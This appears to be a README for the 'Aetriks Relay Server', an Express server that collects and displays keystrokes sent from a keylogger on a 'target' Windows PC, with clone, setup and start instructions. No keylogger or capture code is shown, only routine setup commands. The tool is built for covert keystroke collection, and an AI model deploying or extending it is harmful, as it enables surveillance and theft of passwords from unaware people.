# Aetriks Relay Server

The Aetriks Relay Server is a lightweight Express-based server designed to receive and log keystroke data from the Aetriks Keylogger running on a Windows target PC.

---

## Features

- **Keystroke Logging**: Receives keystroke data from the Aetriks Keylogger and logs it to a file (`keyboard_capture.txt`).
- **Web Interface**: Provides a simple web interface to view logged keystrokes.
- **API Endpoints**: Includes endpoints for logging keystrokes and advanced integrations.
- **Lightweight**: Built using Node.js and Express, ensuring minimal resource usage.
- **Customizable**: Easily configurable to change the listening port or extend functionality.

---

## Installation Guide (Linux)

### **Step 1: Clone the Repository**

1. Clone the Aetriks Relay Server repository:
   ```bash
   cd ~/Aetriks/
   git clone https://github.com/frHimanshu/aetriks-relay.git
   cd aetriks-relay
   ```

---

### **Step 2: Run the Setup Script**

1. Ensure `commands.txt` is present in the repository. This file contains the commands required to set up the server.

2. Run the setup script:
   ```bash
   python3 setup.py
   ```
      This will execute the commands listed in `commands.txt` to set up the environment.
   
3. Reboot the system
   ```bash
   sudo reboot
   ```
   
---

### **Step 3: Start the Server**

1. Start the server:
   ```bash
   npm start
   ```

   The server will start and listen on port `8080` by default.

2. Verify the server is running by checking the logs:
   ```bash
   App is listening on port 8080
   ```

---

## Configuration

The server is pre-configured to listen on port `8080`. If you need to change the port, edit the `server.js` file:
```javascript
const port = 8080; // Change this to your desired port
```

---

## License

This project is licensed under the MIT License. See the `LICENSE` file for details.
